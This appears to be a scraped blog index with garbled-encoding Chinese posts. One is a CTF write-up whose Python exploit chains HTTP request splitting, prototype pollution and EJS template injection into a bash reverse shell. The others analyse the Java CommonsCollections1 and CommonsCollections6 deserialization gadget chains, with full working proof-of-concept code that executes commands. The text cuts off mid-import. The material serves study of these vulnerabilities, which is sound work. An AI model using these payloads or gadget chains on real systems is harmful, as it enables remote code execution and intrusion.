è¿™é‡Œçš„curlä¼šå‘èµ·ä¸€ä¸ªgetæ–¹å¼çš„httpè¯·æ±‚ï¼Œä½†æ˜¯è¿™ä¸ªurlå·²ç»å†™æ­»äº†ï¼Œè€Œä¸”copyè·¯ç”±æ˜¯éœ€è¦postæ–¹å¼å‘èµ· æ³¨æ„é¢˜ç›®çš„dockerç¯å¢ƒFROM node:8.1.2 è¿™ä¸ªç‰ˆæœ¬å­˜åœ¨HTTPæ‹†åˆ†æ”»å‡»ï¼Œå¯ä»¥è§£å†³æˆ‘ä»¬ä¸Šé¢ä¸¤ä¸ªé—®é¢˜ å…‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“æ²¡ä»€ä¹ˆç”¨ï¼Œå®ƒè¿˜æ˜¯ä¸€ä¸ªejsçš„æ¨¡ç‰ˆå­˜åœ¨rceï¼Œå‚è€ƒ https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/ expå‚è€ƒAndyNodelå¸ˆå‚…ï¼Œè†œä¸€ä¸‹orz &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;import requestspayload = ''' HTTP/1.1POST /copy HTTP/1.1Host: 127.0.0.1:3000Content-Length: 180Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6Connection: close{&quot;constructor.prototype.outputFunctionName&quot;: &quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\\&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\\\&quot;');var __tmp2&quot;}GET / HTTP/1.1test:'''.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;)def payload_encode(raw): ret = u&quot;&quot; for i in raw: ret += chr(0x0100+ord(i)) return retprint(payload)url = f&quot;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/curl?q={payload_encode(payload)}&quot;requests.get(url=url) å‚è€ƒè¿˜æœ‰ä¸¤é¢˜ https://mp.weixin.qq.com/s/NjjXKyXimtAEnKIkdPXHxA https://github.com/PGYER/codefever/issues/136 http://www.andynoel.xyz/?p=621","link":"/2023/02/05/2022westlake/"},{"title":"CommonsCollections6åˆ©ç”¨é“¾åˆ†æ","text":"å‰è¨€è¶Šæ¥è¶Šæ‘†äº†ï¼Œçºªå¿µæˆ‘å•¥ä¹Ÿæ²¡å¹²çš„ä¸€å‘¨ åˆ†æè¿™æ¡é“¾ä¸å—jdkç‰ˆæœ¬é™åˆ¶è€Œä¸”å’ŒURLDNSé‚£æ¡ç±»ä¼¼ï¼ˆæŠ½ç©ºåˆå»çœ‹äº†ä¸€ä¸‹ã€‚ å€Ÿç™½æ—¥æ¢¦ç»„é•¿çš„å›¾å’Œyso å®ƒå’ŒCC1ååŠéƒ¨åˆ†æ˜¯ä¸€æ ·çš„ï¼Œè°ƒç”¨LazyMap.getç„¶åChainedTransformer.transform() ä¸»è¦å‰é¢æ˜¯åˆ©ç”¨HashMap.putï¼Œç„¶åæˆ‘ä»¬ä¹‹å‰åˆ†æè¿‡urldnsé“¾çŸ¥é“ï¼Œå®ƒä¼šè°ƒç”¨hashCodeæ–¹æ³•ã€‚å†å»è°ƒç”¨è¿™ä¸ªLazyMapçš„get è€Œä½œè€…è¿™é‡Œå°±æ‰¾åˆ°äº†ä¸€ä¸ªTiedMapEntryç±»ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¿›å‘ç°ï¼Œä»–çš„hashCodeè°ƒç”¨äº†getValueæ–¹æ³• å†è·Ÿè¿›ï¼Œå°±ä¼šå‘ç°è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªmap.getï¼Œè€Œè¿™ä¸ªmapæˆ‘ä»¬ä¼ å…¥ä¸ºLazyMapå°±å®Œæˆäº†æ•´æ¡é“¾çš„åˆ©ç”¨ æˆ‘ä»¬å°è¯•ç¼–å†™POC public class CommonsCollections6 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;(); Map lazyMap = LazyMap.decorate(hashMap1, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;lnk&quot;); HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap2.put(tiedMapEntry, &quot;qqw&quot;); serialize(hashMap2); //unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object object = ois.readObject(); return object; }} è¿™æ ·æˆ‘ä»¬çŸ¥é“å…¶å®æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºåœ¨urldnsé‚£æ¡é“¾é‡Œæˆ‘ä»¬å°±å‘ç°ï¼Œå®ƒåœ¨putçš„æ—¶å€™å°±å·²ç»èµ°äº†hashæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±å·²ç»æ‰§è¡Œäº†ï¼Œå¹¶æ²¡æœ‰åˆ°ååºåˆ—åŒ–ã€‚ è¿™ä¸ªé—®é¢˜çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å‰é¢çš„LazyMapï¼Œç„¶ååˆ©ç”¨åå°„å»æ”¹å›æ¥ å¦‚ä¸‹ public class CommonsCollections6 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;(); // é˜²æ­¢åºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ Map lazyMap = LazyMap.decorate(hashMap1, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;lnk&quot;); HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap2.put(tiedMapEntry, &quot;qqw&quot;); Class cls = lazyMap.getClass(); Field factoryField = cls.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); serialize(hashMap2); //unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object object = ois.readObject(); return object; }} è¿™æ ·çš„è¯ï¼Œåœ¨putå°±ä¸ä¼šè§¦å‘è°ƒç”¨äº†ï¼Œåºåˆ—åŒ–çš„æ—¶å€™æ”¹å›æ¥å°±å¯ä»¥äº†ã€‚ ä½†æ˜¯æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå‘ç°è¿™æ ·ä¹Ÿæ²¡æœ‰æ‰§è¡Œã€‚æˆ‘ä»¬åœ¨putä¸‹ä¸ªæ–­ç‚¹debugçœ‹ä¸€ä¸‹ æˆ‘ä»¬ä¸€è·¯è·Ÿåˆ°è¿™é‡Œä¼šå‘ç°ï¼ŒLazyMapçš„getæ–¹æ³•é¦–å…ˆä¼šåˆ¤æ–­è¿™ä¸ªkeyæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå®ƒä¹Ÿä¼šæ‰§è¡Œä¸€ä¸ªputï¼ŒæŠŠæˆ‘ä»¬è¿™ä¸ªkeyå­˜è¿›å»ï¼Œæ‰€ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¿™é‡Œå°±å·²ç»æœ‰è¿™ä¸ªkeyäº† è¿™ä¸ªé—®é¢˜æˆ‘ä»¬åªéœ€è¦removeæ‰åŸå…ˆçš„é‚£ä¸ªkeyå°±å¥½äº† æœ€ç»ˆçš„POCå¦‚ä¸‹ public class CommonsCollections6 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;(); // é˜²æ­¢åºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ Map lazyMap = LazyMap.decorate(hashMap1, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;lnk&quot;); HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap2.put(tiedMapEntry, &quot;qqw&quot;); lazyMap.remove(&quot;lnk&quot;); Class cls = lazyMap.getClass(); Field factoryField = cls.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); serialize(hashMap2); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object object = ois.readObject(); return object; }}","link":"/2022/11/27/CC6/"},{"title":"CommonsCollections1åˆ©ç”¨é“¾åˆ†æ","text":"å‰è¨€å’•å’•å’•äº†ä¸€æ®µæ—¶é—´Javaçš„å­¦ä¹ ï¼Œè¶ç€ä¸Šä¸ªæœˆçš„äº‹æƒ…å¿™å®Œï¼Œæ¥ç€æ¥å­¦ä¹ å¤ç°ä¸€ä¸‹è‘—åçš„CommonsCollections1ä¹Ÿå°±æ˜¯CC1é“¾çš„æ¼æ´åˆ†æ ç¯å¢ƒæˆ‘å‚è€ƒçš„æ˜¯ç™½æ—¥æ¢¦ç»„é•¿çš„ï¼Œé¦–å…ˆJDKç‰ˆæœ¬ä¸‹è½½jdk8u65çš„ï¼Œå› ä¸ºè¿™ä¸ªæ¼æ´åœ¨é«˜ç‰ˆæœ¬ä¸­æ˜¯è¢«ä¿®å¤äº†çš„ï¼Œç„¶åå¯¼å…¥å¯¹åº”ç‰ˆæœ¬çš„sunåŒ…javaæºç ï¼Œæ–¹ä¾¿è°ƒè¯•åˆ†æ ä¸‹è½½é“¾æ¥ JDK8u65 openjdk 8u65 ä¸‹å¥½åï¼Œå…ˆåœ¨IDEAé‡Œåˆ›å»ºä¸€ä¸ªmavené¡¹ç›®ï¼Œç„¶åé€‰æ‹©å¯¹åº”ç‰ˆæœ¬çš„jdkï¼Œå¯¼å…¥è§£å‹å‡ºæ¥çš„srcç›®å½•ï¼ˆè®°å¾—æŠŠopenjdkçš„sunåŒ…æ”¾è¿›å»ï¼‰ ç„¶åä¸‹è½½mavençš„ä¾èµ–ï¼Œè¿™é‡Œé€‰æ‹©çš„ç‰ˆæœ¬æ˜¯3.2.1 åˆ†æé¦–å…ˆè¿™é‡Œå¼•ç”¨ä¸€ä¸‹ç™½æ—¥æ¢¦ç»„é•¿çš„ååºåˆ—åŒ–æ”»å‡»çš„æ€è·¯ å…¥å£éœ€è¦ä¸€ä¸ªreadObjectï¼Œç„¶åå°¾éƒ¨éœ€è¦æœ‰å¦‚å‘½ä»¤æ‰§è¡Œçš„å±é™©æ–¹æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯æ˜¯ä»åå¾€å‰æ‰¾ æ ¹æ®å‰äººçš„æ€»ç»“ï¼Œæˆ‘ä»¬çŸ¥é“å¯»æ‰¾Transformeræ¥å£å»æŒ–æ˜æ¼æ´ å®ƒæœ‰ä¸€ä¸ªtransformçš„æ–¹æ³•ï¼Œæ¥æ”¶ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè¿›è¡Œä¸€äº›æ“ä½œã€‚ æˆ‘ä»¬ä¸»è¦çœ‹ä»–çš„ä¸€äº›å®ç°ç±» è¿™ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬ä¸»è¦å…ˆçœ‹è¿™ä¸ªInvokerTransformerï¼Œå®ƒçš„transformæ–¹æ³•å°±æ˜¯ä¸€ä¸ªåå°„ä»»æ„è°ƒç”¨ç±»ï¼Œå¹¶ä¸”å‚æ•°æˆ‘ä»¬éƒ½å¯æ§ï¼Œå¾ˆåƒæ˜¯ä¸€ä¸ªåé—¨çš„å†™æ³•ã€‚ æ‰€ä»¥æˆ‘ä»¬å…ˆå°è¯•åˆ©ç”¨è¿™ä¸ªç±»æ¥æ‰§è¡Œå‘½ä»¤ Runtime runtime = Runtime.getRuntime();// Class cls = Runtime.class;// Method execMethod = cls.getDeclaredMethod(&quot;exec&quot;, String.class);// execMethod.setAccessible(true);// execMethod.invoke(runtime, &quot;open /System/Applications/Calculator.app&quot;); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); invokerTransformer.transform(runtime); æˆåŠŸæ‰§è¡Œäº† æ¥ç€æˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯å»æ‰¾è°ƒç”¨transformçš„ä¸åŒåå‡½æ•°ï¼Œå› ä¸ºå¦‚æœæ˜¯åŒåï¼Œé‚£å°±æ— æ³•æ„æˆé“¾äº†ï¼Œä¸èƒ½åˆ°åˆ«çš„æ–¹æ³•é‡Œï¼Œå°±æ²¡æœ‰æ„ä¹‰ã€‚ è¿™é‡Œçš„è¯ï¼Œé‡‡ç”¨ideaçš„find usages,ä½†æ˜¯å®ƒåªèƒ½æ‰¾javaæ–‡ä»¶ï¼Œä¸èƒ½æ‰¾classæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸ºå•¥ä¹‹å‰è¦å¯¼å…¥sunåŒ…æºç ã€‚ ç„¶åæˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªTransformedMapçš„checkSetValueæ–¹æ³•ï¼Œå®ƒçš„è¿™ä¸ªvalueTransformerè°ƒç”¨äº†transformæ–¹æ³•ï¼Œå¹¶ä¸”è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•æ˜¯ä¸€ä¸ªprotectedï¼Œæ‰€ä»¥ä»–åªèƒ½è‡ªå·±è°ƒç”¨ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸‹ å‘ç°åœ¨è¿™ä¸ªdecorateè¿™é‡Œè°ƒç”¨äº† å°è¯•æ„é€ ä¸€ä¸‹POC Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map map = TransformedMap.decorate(hashMap, null, invokerTransformer); Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class; Method checkSetValue = transformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class); checkSetValue.setAccessible(true); checkSetValue.invoke(map,runtime); æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨decorateå»åˆ›å»ºTransformedMapå¯¹è±¡ï¼Œå› ä¸ºä½œç”¨åŸŸæ˜¯protectedï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥è·å–ï¼Œå†å»è°ƒç”¨å…¶checkSetValueæ–¹æ³•ï¼Œç„¶åä¼šè§¦å‘transformï¼Œæˆ‘ä»¬è·Ÿè¿›å»å‘ç°æˆåŠŸæ‰§è¡Œã€‚ ç„¶åæˆ‘ä»¬æ¥ç€ç»§ç»­æ‰¾å“ªä¸ªåœ°æ–¹è°ƒç”¨äº†checkSetValueï¼Œå‘ç°æ˜¯TransformedMapçš„çˆ¶ç±»ï¼ŒæŠ½è±¡ç±»ï¼ŒAbstractInputCheckedMapDecoratorå†…éƒ¨çš„MapEntryç±» setValue() å®é™…ä¸Šå°±æ˜¯åœ¨ Map ä¸­å¯¹ä¸€ç»„ entry(é”®å€¼å¯¹)è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚å¯¹Mapè¿›è¡Œéå†çš„æ—¶å€™ã€‚ äºæ˜¯æˆ‘ä»¬åœ¨è¿›è¡Œå¯¹è°ƒç”¨decorateæ–¹æ³•çš„Mapéå†æ—¶ï¼Œè°ƒç”¨setValue()ç„¶åå°±ä¼šèµ°åˆ°checkSetValue æˆ‘ä»¬æ¥æ›´æ–°ä¸€ä¸‹POC Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer); for (Map.Entry entry: transformedMap.entrySet()) { entry.setValue(runtime); } åˆ°è¿™ä¸€æ­¥æˆ‘ä»¬çš„ç›®çš„å°±å˜æˆäº†ï¼Œå¦‚æœæœ‰ä¸€ä¸ªéå†æ•°ç»„çš„åœ°æ–¹ï¼Œç„¶åè°ƒç”¨äº†setValue()æ–¹æ³•ï¼Œæœ€å¥½æ˜¯åœ¨readObjectæ–¹æ³•é‡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ç›´æ¥æ„é€ POCäº† ç»§ç»­find usages AnnotationInvocationHandleré¦–å…ˆçœ‹åå­—æˆ‘ä»¬çŸ¥é“ä»–æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†å¤„ç†çš„ç±» è¿™é‡Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªifæ¡ä»¶åˆ¤æ–­ï¼Œæ‰èƒ½èµ°åˆ°setValue AnnotationInvocationHandler çš„ä½œç”¨åŸŸä¸º defaultï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡åå°„çš„æ–¹å¼æ¥è·å–è¿™ä¸ªç±»åŠå…¶æ„é€ å‡½æ•° å…ˆæ„é€ å‡ºç®€å•çš„pocå†ä¸€ä¸€è§£å†³é—®é¢˜ Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer); Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Override.class,transformedMap); serialize(obj); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } ç°åœ¨å­˜åœ¨ä¸‰ä¸ªé—®é¢˜ ä¸€ï¼šRuntimeå¯¹è±¡ä¸å¯ä»¥åºåˆ—åŒ–ï¼Œæˆ‘ä»¬è¦é€šè¿‡åå°„å»å˜æˆå¯åºåˆ—åŒ– äºŒï¼šä¹‹å‰é‚£ä¸¤ä¸ªifåˆ¤æ–­ ä¸‰ï¼šæœ€åsetValueçš„å‚æ•°å¯¹è±¡æ˜¯ä¸€ä¸ªä»£ç†ç±»ï¼Œæˆ‘ä»¬ä¸å¯æ§ é¦–å…ˆç¬¬ä¸€ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Runtime.classæ¥åºåˆ—åŒ–ï¼Œå¹¶ä¸”å°†å®ƒæ”¹å†™ä¸ºInvokerTransformerç‰ˆæœ¬è°ƒç”¨ Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getRuntime&quot;, new Class[]{String.class, Class[].class},new Object[]{&quot;getRuntime&quot;,null}).transform(Runtime.class); Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object.class}, new Object[]{null, null}).transform(getRuntimeMethod); new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}).transform(runtime); // Class&lt;Runtime&gt; cls = Runtime.class; // Method getRuntimeMethod = cls.getMethod(&quot;getRuntime&quot;,null); // Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);// Method execmethod = cls.getMethod(&quot;exec&quot;, String.class);// execmethod.invoke(runtime, &quot;open /System/Applications/Calculator.app&quot;); ç„¶åå¯ä»¥åˆ©ç”¨ChainedTransformerï¼Œåšä¸€ä¸ªé€’å½’çš„è°ƒç”¨ï¼Œå‡å°‘ä»£ç çš„å¤ç”¨é‡ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); æ¥ç€ç¬¬äºŒä¸ªé—®é¢˜ï¼Œifåˆ¤æ–­ï¼Œæˆ‘ä»¬ä¸‹æ–­ç‚¹ å‘ç°ç¬¬ä¸€ä¸ªmemberTypeåˆ¤æ–­ä¸è¿‡å»ï¼Œå› ä¸ºåœ¨è¿™é‡Œè·å–ä¼ å‚æ³¨è§£çš„æˆå‘˜æ–¹æ³• æ‰€ä»¥æˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬è¿™é‡Œä¼ çš„æ˜¯ä¸€ä¸ªoverrideçš„æ³¨è§£ï¼Œè€Œä»–æ˜¯æ²¡æœ‰æˆå‘˜æ–¹æ³•çš„ï¼Œæ‰€ä»¥è¿‡ä¸å»ç¬¬ä¸€ä¸ªåˆ¤æ–­ã€‚ æˆ‘ä»¬å¯ä»¥æ”¹æˆè¿™ä¸¤ä¸ªï¼Œå¹¶ä¸”è®¾ç½®hashMap.putä¸­é”®ä¸ºvalueï¼Œç»•è¿‡ç¬¬äºŒä¸ªif æˆåŠŸè¿›æ¥ï¼Œä½†æ˜¯ç¬¬ä¸‰ä¸ªé—®é¢˜ï¼ŒsetValue() å¤„ä¸­çš„å‚æ•°ä¸å¯æ§ï¼Œæ˜¯ AnnotationTypeMismatchExceptionProxy ç±» è¿™ä¸ªæ—¶å€™å°±è¦æƒ³åˆ°ä¹‹å‰çš„ConstantTransformerï¼Œ ä»–çš„transformæ–¹æ³•ï¼Œæ— è®ºä¼ å…¥ä»€ä¹ˆï¼Œä»–éƒ½è¿”å›ä¹‹å‰æ„é€ æ–¹æ³•çš„é‚£ä¸ªiConstantå­˜çš„å¯¹è±¡ æ‰€ä»¥æˆ‘ä»¬å…ˆä¼ å…¥ä¸€ä¸ª Runtime.classï¼Œç„¶åæ— è®º ä»–çš„transform() æ–¹æ³•è°ƒç”¨ä»»ä½•å¯¹è±¡ï¼Œéƒ½ä¼šè¿”å› Runtime.class æ‰€ä»¥è¿™ä¹Ÿå°±æ˜¯æœ€ç»ˆçš„POC import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class CommonsCollections1 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;, &quot;qqw&quot;); Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Target.class,transformedMap); serialize(obj); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; }} æ€»ç»“ è¿™æ¡é“¾çœ‹èµ·æ¥æ˜¯é‚£ä¹ˆçš„å·§åˆï¼Œè®©æˆ‘è®¤è¯†åˆ°äº†æˆ‘é€Ÿæˆçš„JavaåŸºç¡€è¿˜æ˜¯ä¸å¤ªè¡Œï¼Œæ€»ä¹‹ï¼Œå¤šè°ƒè¯•å¤šåˆ†æã€‚ å‚è€ƒhttps://drun1baby.github.io/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#toc-heading-1 https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.788&amp;vd_source=18a3ab614a59493e37ea0cb1f984fb56","link":"/2022/11/03/CC1/"},{"title":"CommonsCollections1åˆ©ç”¨é“¾åˆ†æ---LazyMapé“¾","text":"å‰è¨€æ‘†äº†ä¸€ä¸¤å¤©ï¼Œè¡¥ä¸Šå‰é¢æ²¡åˆ†æå®Œçš„CommonsCollections1åˆ©ç”¨é“¾ï¼Œè¿™æ¡LazyMapé“¾åº”è¯¥æ‰æ˜¯æ­£ç‰ˆçš„CC1é“¾hhh åˆ†æ ç”±ä¸Šå›æˆ‘ä»¬çŸ¥é“ï¼Œå½“æ—¶æ‰¾åˆ°ä¸‰æ¡Mapé“¾ï¼Œä¹‹å‰æˆ‘ä»¬æ‰¾çš„æ˜¯TransformedMapï¼Œè¿™æ¬¡æˆ‘ä»¬åˆ†æLazyMapã€‚ è¿™ä¸ªgetæ–¹æ³•é‡Œé¢ä¹Ÿè°ƒç”¨äº†transformï¼Œæˆ‘ä»¬ç»§ç»­å‘ä¸Šçœ‹ å‘ç°äº†è¿™é‡Œä¹Ÿæœ‰ä¹‹å‰å‡ºç°è¿‡çš„decorateæ–¹æ³•ï¼Œè¿™ä¸ªç±»çš„æ„é€ å‡½æ•°æ˜¯protectedï¼Œæ— æ³•ç›´æ¥è·å–ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆå¯ä»¥é€šè¿‡decorateæ–¹æ³•æ¥newä¸€ä¸ªLazyMapå¯¹è±¡ã€‚æˆ‘ä»¬æ„é€ POCå¦‚ä¸‹ import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.HashMap;import 